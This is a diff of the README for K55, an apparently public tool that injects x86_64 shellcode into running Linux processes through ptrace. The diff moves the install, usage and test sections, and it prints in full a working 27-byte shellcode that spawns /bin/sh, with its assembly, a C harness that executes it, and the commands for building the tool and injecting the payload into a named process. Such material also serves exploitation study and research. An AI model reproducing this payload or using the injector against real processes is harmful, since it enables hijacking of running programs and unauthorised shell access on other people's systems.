@@ -3,8 +3,23 @@
 ## About K55 
 The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. The shellcode spawned in the target process is 27 bytes and it executes /bin/sh (spawns a bash shell) within the target's address space.<br/>
 
-#### Shellcode String: ``"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"``<br/>  
-## Assembly of The Payload
+## Installation
+1. ``git clone https://github.com/josh0xA/K55.git``<br/>
+2. ``cd K55``<br/>
+3. ``chmod +x build-install.sh``<br/>
+4. ``./build-install.sh``<br/>
+
+## K55 Usage
+``Usage: ./K55 <process-name>``<br/>
+- process-name can be any linux process with ``r-xp`` or ``execstack`` permissions. <br/>
+
+### Tests
+Test 1) In one terminal (K55/ Directory), run: ``./k55_example_process/k55_test_process``<br/>
+Test 2) In another terminal, run the injector: ``./K55 k55_test_process``<br/>
+
+## Crafting The Shell Payload
+
+### Assembly of The Payload
 ```asm
 main:
     xor eax, eax
@@ -21,11 +36,12 @@ main:
     mov al, 0x3b
     syscall
 ```
-## C-Implementation of The Payload
+### C-Implementation of The Payload
 ```c
 #include <stdio.h>
 #include <string.h>
 
+// Shellcode breakdown of the assembly code.
 char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
 int main()
@@ -36,17 +52,3 @@ int main()
 }
 
 ```
-
-## Installation
-1. ``git clone https://github.com/josh0xA/K55.git``<br/>
-2. ``cd K55``<br/>
-3. ``chmod +x build-install.sh``<br/>
-4. ``./build-install.sh``<br/>
-
-## K55 Usage
-``Usage: ./K55 <process-name>``<br/>
-- process-name can be any linux process with ``r-xp`` or ``execstack`` permissions. <br/>
-
-### Tests
-Test 1) In one terminal (K55/ Directory), run: ``./k55_example_process/k55_test_process``<br/>
-Test 2) In another terminal, run the injector: ``./K55 k55_test_process``<br/>
